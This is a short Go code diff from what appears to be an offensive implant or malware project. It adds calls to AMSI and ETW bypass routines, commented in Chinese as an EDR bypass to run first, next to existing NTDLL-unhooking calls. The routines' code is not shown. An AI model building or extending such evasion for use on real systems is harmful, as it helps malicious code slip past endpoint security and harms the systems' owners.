@@ -43,6 +43,10 @@ func normalInit() {
 func main() {
 	normalInit()
 
+	// ===== EDR 绕过：AMSI + ETW Patch（必须在最早阶段执行）=====
+	evasion.BypassAMSI()
+	evasion.BypassETW()
+
 	evasion.InitLegitimateAPIs()
 
 	evasion.NtdllUnhook()
